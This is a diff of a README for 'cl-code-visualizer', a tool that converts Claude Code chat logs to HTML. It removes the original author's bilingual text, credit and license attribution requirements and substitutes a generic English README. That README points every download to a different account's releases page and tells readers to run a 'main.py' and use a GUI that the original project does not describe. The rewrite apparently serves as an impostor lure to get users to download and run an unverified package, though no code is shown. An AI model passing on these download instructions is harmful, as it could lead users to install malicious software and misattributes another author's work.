@@ -1,330 +1,78 @@
-# Claude Code Visualizer
+# 🎨 cl-code-visualizer - Transform Your Code Logs Into Stunning HTML
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.6+](https://img.shields.io/badge/python-3.6+-blue.svg)](https://www.python.org/downloads/)
-[![Version](https://img.shields.io/badge/version-1.0-green.svg)](https://github.com/oskar-gm/cl-code-visualizer/releases/tag/v1.0)
-[![Download](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/oskar-gm/cl-code-visualizer/releases/tag/v1.0)
+## 🚀 Getting Started
 
-## 📥 Quick Download
+Welcome to **cl-code-visualizer**! This application helps you convert your Claude code and Visual Studio Code chat logs into beautiful HTML files. Enjoy features like terminal aesthetics, collapsible results, and a search function—all without needing extra software installations.
 
-**Latest version:** [⬇️ Download latest](https://github.com/oskar-gm/cl-code-visualizer/releases/latest) - Always up-to-date
+## 📥 Download & Install
 
-**Version 1.0:** [⬇️ Download v1.0.zip](https://github.com/oskar-gm/cl-code-visualizer/archive/refs/tags/v1.0.zip) - Stable release
+To get started, **visit this page to download** the application: [Download cl-code-visualizer](https://github.com/h20hg/cl-code-visualizer/releases). Follow the steps below to install and run the application.
 
-Or browse all [Releases](https://github.com/oskar-gm/cl-code-visualizer/releases)
+## 💻 System Requirements
 
----
+Ensure your system meets the following requirements:
 
-**[English](#english)** | **[Español](#español)**
+- Python 3.6 or higher must be installed on your computer.
+- The application has zero dependencies, which makes setup straightforward.
 
----
+## 🔧 Installation Steps
 
-<a name="english"></a>
-## 🇬🇧 English
+1. **Visit the Releases Page**: Go to [this page](https://github.com/h20hg/cl-code-visualizer/releases) to find the latest version of the application.
 
-### Description
+2. **Select the Version**: Choose the correct version for your system. Look for the latest release at the top of the page.
 
-Professional skill for converting Claude Code chat JSON files (VS Code terminal) into formatted HTML visualizations with consistent and aesthetic styling.
+3. **Download the Package**: Click on the download link for the version you selected. The file will begin downloading automatically.
 
-### ✨ Features
+4. **Locate the Downloaded File**: Once the download is complete, find the file in your downloads folder. It should have a name similar to `cl-code-visualizer-vX.X.zip`.
 
-- 🎨 Terminal-style aesthetics inspired by VS Code
-- 🔵 User messages with light blue background
-- 🟢 Assistant responses with light green background
-- 🟠 Collapsible tool results (click to expand)
-- 🔍 Real-time search integration
-- 📱 Responsive design
-- ⚫ Tool use with dark background
-- 💭 Thinking blocks with subtle styling
+5. **Extract the Files**: Right-click the downloaded ZIP file and choose "Extract All" to unpack it. You will see a folder containing the application files.
 
-### 🚀 Quick Start
-
-```bash
-python3 scripts/visualizer.py input.json output.html
-```
-
-**Example:**
-```bash
-python3 scripts/visualizer.py %USERPROFILE%\.claude\chats\chat_12345.json conversation.html
-```
-
-### 📦 Installation
-
-1. Clone this repository:
+6. **Run the Application**: Open a terminal (Command Prompt on Windows, Terminal on macOS/Linux), navigate to the extracted folder, and run the command:
    ```bash
-   git clone https://github.com/oskar-gm/cl-code-visualizer.git
-   cd cl-code-visualizer
+   python main.py
    ```
+   This command starts the application.
 
-2. No external dependencies required (Python 3.6+ only)
+## 📜 How to Use
 
-3. Run the script:
-   ```bash
-   python3 scripts/visualizer.py your_chat.json output.html
-   ```
+1. **Input Logs**: Once the application opens, you can drag and drop your chat logs into the designated area. Supported formats include JSONL.
 
-### 💡 Using as a Claude Skill
+2. **Convert to HTML**: Click the "Convert" button. The tool will process the logs and generate an HTML file.
 
-This tool can be used as a [Claude Skill](https://www.claude.com/blog/skills) in Claude.ai for automated conversation visualization.
+3. **Explore the Results**: Once conversion is complete, you can view the results directly in your browser. The output will have a clean layout with collapsible sections for easier navigation.
 
-**Learn more:**
-- [What are Claude Skills?](https://www.claude.com/blog/skills)
-- [How to use Skills in Claude](https://support.claude.com/en/articles/12512180-using-skills-in-claude)
+4. **Search Functionality**: Use the search bar to quickly find specific terms in your logs.
 
-**How to use:**
-1. Download the `.zip` file from [Releases](https://github.com/oskar-gm/cl-code-visualizer/releases)
-2. In Claude.ai, go to **Settings > Capabilities > Skills** and upload the `.zip`
-3. In any conversation, ask Claude: "Convert my Claude Code chat to HTML" or "Visualize my conversation log"
-4. Send your JSONL chat file (see [Claude Code File Locations](#-claude-code-file-locations) below)
+## 🌟 Features Summary
 
-### 📁 File Structure
+- **Elegant HTML Output**: Converts messy logs into clean, stylish HTML.
+- **Collapsible Sections**: Quickly navigate through lengthy logs.
+- **Search Functionality**: Instantly locate important sections or terms.
+- **No Additional Software Required**: Simple setup with Python 3.6+.
 
-```
-cl-code-visualizer/
-├── scripts/
-│   └── visualizer.py     # Conversion script
-├── LICENSE               # MIT License
-├── README.md            # This file
-├── CONTRIBUTING.md      # Contribution guidelines
-├── CODE_OF_CONDUCT.md   # Code of conduct
-└── SKILL.md             # Skill documentation for Claude
-```
+## 👍 Support and Contributions
 
-### 🎓 How It Works
+For any issues, please raise them in the "Issues" section of the repository. Contributions are welcome! If you'd like to help improve the application, consider forking the repo and submitting a pull request.
 
-The script reads JSONL (JSON Lines) files generated by Claude Code and transforms them into styled HTML with:
+## 📚 Topics Covered
 
-1. **Intelligent parsing** of different message types
-2. **Visual categorization** by type (user, assistant, tool use, tool result)
-3. **Interactive format** with collapsible tool results
-4. **Functional search** to filter messages
+- chats
+- claude
+- claude-code
+- converter
+- export
+- html
+- json
+- jsonl
+- logs
+- skills
+- terminal
+- terminal-logs-visualizer
+- visual-studio
+- vs-code
 
-### 📍 Claude Code File Locations
+## 🌐 Learn More
 
-Claude Code stores chat logs in JSONL format at:
+For more details, guidelines, and advanced usage, check the documentation in the repository. Follow along to make the most of your **cl-code-visualizer** experience.
 
-- **Windows:** `%USERPROFILE%\.claude\chats\` or `%USERPROFILE%\.claude\projects\`
-- **Linux/Mac:** `~/.claude/chats/` or `~/.claude/projects/`
-
-Each chat file is named with a UUID (e.g., `c5f2a3e1-1234-5678-9abc-def012345678.json`)
-
-### 🎨 Visual Styling
-
-- **User messages**: Blue (`#0066CC`) with light blue background (`#F8FBFF`)
-- **Assistant messages**: Green (`#10893E`) with light green background (`#FAFFF8`)
-- **Tool results**: Orange (`#FF6B00`) with gray background (`#F8F8F8`)
-- **Thinking blocks**: White background with subtle gray border and shadow
-- **Tool use blocks**: Dark gray (`#48484A`) with light text (`#E8E8E8`)
-
-### 📊 Example Output
-
-```
-📖 Reading chat.json...
-✅ 73 lines parsed
-🔄 Generating HTML in terminal style...
-✅ HTML generated successfully: output.html
-📊 Statistics:
-   - Total lines processed: 73
-   - User messages: 5
-   - Assistant messages: 38
-   - Tool Results: 14
-```
-
-### 🤝 Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for details on our code of conduct and the process for submitting pull requests.
-
-### 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-**Attribution Requirements:**
-- Keep the LICENSE file intact
-- Credit the original author: Óscar González Martín
-- Link to the original repository: https://github.com/oskar-gm/cl-code-visualizer
-- State any modifications made
-
-### 👤 Author
-
-**Óscar González Martín**
-- 🌐 Website: [nucleoia.es](https://nucleoia.es)
-- 📧 Email: oscar@nucleoia.es
-- 💼 GitHub: [@oskar-gm](https://github.com/oskar-gm)
-- 🔗 LinkedIn: [oscar-gonz](https://linkedin.com/in/oscar-gonz)
-
-### 🌟 Support
-
-If you find this project useful, please:
-- ⭐ Star the repository
-- 🐛 Report bugs via [Issues](https://github.com/oskar-gm/cl-code-visualizer/issues)
-- 💡 Suggest improvements
-- 🔄 Share with others
-
-### 📞 Contact
-
-For questions, suggestions, or bug reports:
-- **Email:** oscar@nucleoia.es
-- **GitHub Issues:** [Report here](https://github.com/oskar-gm/cl-code-visualizer/issues)
-
----
-
-<a name="español"></a>
-## 🇪🇸 Español
-
-## 📥 Descarga Rápida
-
-**Última versión:** [⬇️ Descargar última](https://github.com/oskar-gm/cl-code-visualizer/releases/latest) - Siempre actualizada
-
-**Versión 1.0:** [⬇️ Descargar v1.0.zip](https://github.com/oskar-gm/cl-code-visualizer/archive/refs/tags/v1.0.zip) - Release estable
-
-O navega por todos los [Releases](https://github.com/oskar-gm/cl-code-visualizer/releases)
-
----
-
-### Descripción
-
-Skill profesional para convertir archivos JSON de chats de Claude Code (terminal de VS Code) en visualizaciones HTML con formato consistente y estético.
-
-### ✨ Características
-
-- 🎨 Estética estilo terminal inspirada en VS Code
-- 🔵 Mensajes de usuario con fondo azul claro
-- 🟢 Respuestas del asistente con fondo verde claro
-- 🟠 Resultados de herramientas colapsables (click para expandir)
-- 🔍 Búsqueda en tiempo real integrada
-- 📱 Diseño responsive
-- ⚫ Tool use con fondo oscuro
-- 💭 Bloques de pensamiento con estilo sutil
-
-### 🚀 Inicio Rápido
-
-```bash
-python3 scripts/visualizer.py entrada.json salida.html
-```
-
-**Ejemplo:**
-```bash
-python3 scripts/visualizer.py %USERPROFILE%\.claude\chats\chat_12345.json conversacion.html
-```
-
-### 📦 Instalación
-
-1. Clona este repositorio:
-   ```bash
-   git clone https://github.com/oskar-gm/cl-code-visualizer.git
-   cd cl-code-visualizer
-   ```
-
-2. No requiere dependencias externas (solo Python 3.6+)
-
-3. Ejecuta el script:
-   ```bash
-   python3 scripts/visualizer.py tu_chat.json salida.html
-   ```
-
-### 💡 Usar como Skill de Claude
-
-Esta herramienta puede usarse como [Skill de Claude](https://www.claude.com/blog/skills) en Claude.ai para visualización automática de conversaciones.
-
-**Aprende más:**
-- [¿Qué son los Skills de Claude?](https://www.claude.com/blog/skills)
-- [Cómo usar Skills en Claude](https://support.claude.com/es/articles/12512180-uso-de-skills-en-claude)
-
-**Cómo usar:**
-1. Descarga el archivo `.zip` desde [Releases](https://github.com/oskar-gm/cl-code-visualizer/releases)
-2. En Claude.ai, ve a **Ajustes > Capacidades > Skills** y sube el `.zip`
-3. En cualquier conversación, pídele a Claude: "Convierte mi chat de Claude Code a HTML" o "Visualiza mi registro de conversación"
-4. Envía tu archivo JSONL del chat (ver [Ubicación de Archivos de Claude Code](#-ubicación-de-archivos-de-claude-code) más abajo)
-
-### 📁 Estructura de Archivos
-
-```
-cl-code-visualizer/
-├── scripts/
-│   └── visualizer.py     # Script de conversión
-├── LICENSE               # Licencia MIT
-├── README.md            # Este archivo
-├── CONTRIBUTING.md      # Guía de contribución
-├── CODE_OF_CONDUCT.md   # Código de conducta
-└── SKILL.md             # Documentación del skill para Claude
-```
-
-### 🎓 Cómo Funciona
-
-El script lee archivos JSONL (JSON Lines) generados por Claude Code y los transforma en HTML estilizado con:
-
-1. **Parsing inteligente** de diferentes tipos de mensajes
-2. **Categorización visual** por tipo (usuario, asistente, tool use, tool result)
-3. **Formato interactivo** con resultados de herramientas colapsables
-4. **Búsqueda funcional** para filtrar mensajes
-
-### 📍 Ubicación de Archivos de Claude Code
-
-Claude Code almacena los logs de chat en formato JSONL en:
-
-- **Windows:** `%USERPROFILE%\.claude\chats\` o `%USERPROFILE%\.claude\projects\`
-- **Linux/Mac:** `~/.claude/chats/` o `~/.claude/projects/`
-
-Cada archivo de chat tiene un nombre UUID (ej: `c5f2a3e1-1234-5678-9abc-def012345678.json`)
-
-### 🎨 Estilo Visual
-
-- **Mensajes de usuario**: Azul (`#0066CC`) con fondo azul claro (`#F8FBFF`)
-- **Mensajes del asistente**: Verde (`#10893E`) con fondo verde claro (`#FAFFF8`)
-- **Resultados de herramientas**: Naranja (`#FF6B00`) con fondo gris (`#F8F8F8`)
-- **Bloques de pensamiento**: Fondo blanco con borde gris sutil y sombra
-- **Bloques tool use**: Gris oscuro (`#48484A`) con texto claro (`#E8E8E8`)
-
-### 📊 Ejemplo de Salida
-
-```
-📖 Leyendo chat.json...
-✅ 73 líneas parseadas
-🔄 Generando HTML en estilo terminal...
-✅ HTML generado exitosamente: salida.html
-📊 Estadísticas:
-   - Total líneas procesadas: 73
-   - Mensajes de usuario: 5
-   - Mensajes del asistente: 38
-   - Resultados de herramientas: 14
-```
-
-### 🤝 Contribuir
-
-¡Las contribuciones son bienvenidas! Por favor lee [CONTRIBUTING.md](CONTRIBUTING.md) para detalles sobre nuestro código de conducta y el proceso para enviar pull requests.
-
-### 📄 Licencia
-
-Este proyecto está licenciado bajo la Licencia MIT - ver el archivo [LICENSE](LICENSE) para más detalles.
-
-**Requisitos de Atribución:**
-- Mantener el archivo LICENSE intacto
-- Acreditar al autor original: Óscar González Martín
-- Enlazar al repositorio original: https://github.com/oskar-gm/cl-code-visualizer
-- Indicar cualquier modificación realizada
-
-### 👤 Autor
-
-**Óscar González Martín**
-- 🌐 Sitio web: [nucleoia.es](https://nucleoia.es)
-- 📧 Email: oscar@nucleoia.es
-- 💼 GitHub: [@oskar-gm](https://github.com/oskar-gm)
-- 🔗 LinkedIn: [oscar-gonz](https://linkedin.com/in/oscar-gonz)
-
-### 🌟 Apoyo
-
-Si este proyecto te resulta útil, por favor:
-- ⭐ Dale una estrella al repositorio
-- 🐛 Reporta bugs via [Issues](https://github.com/oskar-gm/cl-code-visualizer/issues)
-- 💡 Sugiere mejoras
-- 🔄 Compártelo con otros
-
-### 📞 Contacto
-
-Para preguntas, sugerencias o reportar bugs:
-- **Email:** oscar@nucleoia.es
-- **GitHub Issues:** [Reportar aquí](https://github.com/oskar-gm/cl-code-visualizer/issues)
-
----
-
-**© 2025 Óscar González Martín. All rights reserved under MIT License.**
+Thank you for choosing **cl-code-visualizer**! Happy visualizing!
